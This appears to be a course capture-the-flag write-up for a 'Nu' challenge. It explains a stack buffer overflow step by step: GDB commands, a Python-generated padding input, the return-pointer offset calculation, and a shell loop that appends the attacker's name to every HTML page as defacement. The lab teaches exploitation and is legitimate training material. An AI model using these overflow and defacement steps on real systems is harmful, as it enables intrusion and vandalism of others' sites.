# Nu CHALLENGE (INF473X The Hacking Xperience)

## Run commands

Run `./hack_terminal` to open a fake terminal of the VM. Then, type `cd ; for i in $(find . -name *.html); do echo '<p>YOUR NAME</p>' >>  $i; done` to add `YOUR NAME` at the bottom of the HTML page.


## Explanations


## GDB Tests

### Proof of overwrite

Let's use GDB (a debugger tool) to better understand what's happening in the stack memory. We'll be using the c program _test_gdb.c_ which is a simplified version of the source code of the application. Once it is compiled with the command `gcc -m32 -fno-stack-protector -z execstack test_gdb.c -o test_gdb`, we can run gdb using `gdb test_gdb`.

First of all, let's try to run the program and feed it a too long name with the command `r < attack.txt` (_attack.txt_ contains a 500-long string of letters 'A' and can be generated with Python `python3 -c 'print("A"*500)' > attack.txt`). Gdb replies a segmentation fault :
```
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```
`0x41414141` is supposed to be the return pointer and is now not recognised. Moreover, 41 turns out to be the hexadecimal code for the letter 'A' which isn't a coincidence. Indeed, the return pointer was overwritten by the user's input as the latter entered a too long name.

### Exploitation

Let's dig deeper and try to count the exact number of letters 'A' needed to overwrite the return pointer with the sequence one wants. This count is simply the distance between the return pointer and _greeting_text_ + 12 (the 12 first _"Hello, dear "_). To find the return pointer's position in the stack, I put a break at the beginning (at the `push` level) of the function `parse` with the command `b *0x########` (in my case `b *0x56556231` and can be access when `parse` is disassembled  : `disas parse`). When running the program, it stops at this break and the stack pointer is currently the return pointer. So the return pointer's position can be access with :
```
gdb-peda$ x/xw $sp
0xffffcf1c:	  0x565562d6
```
Now, all that remains is to find _greeting_text_'s position in the memory. The function `strcat` takes two arguments one of which is our interest variable. I put another break at the level of `strcat`, run the program until this second break and show this arguments (`dumpargs` works only with GDB Peda) :
```
gdb-peda$ dumpargs
Guessed arguments:
arg[0]: 0xffffce90 ("Hello, dear ")
arg[1]: 0xffffcd90 ('A' <repeats 200 times>...)
```
The distance between the return pointer and _greeting_text_ can be calculated as such :
```
gdb-peda$ p/d 0xffffcf1c - 0xffffce90
$2 = 140
```

Let's check this count and generate a new _attack.txt_ : `python3 -c 'print("A"*128 + "BBAB") ' > attack.txt`. Go back to gdb and run the program `r < attack.txt` :
```
Stopped reason: SIGSEGV
0x42414242 in ?? ()
```
We still get a segmentation fault but this time, the return pointer has been successfully modified to `42414242` which corresponds to the hexadecimal code of "BBAB".
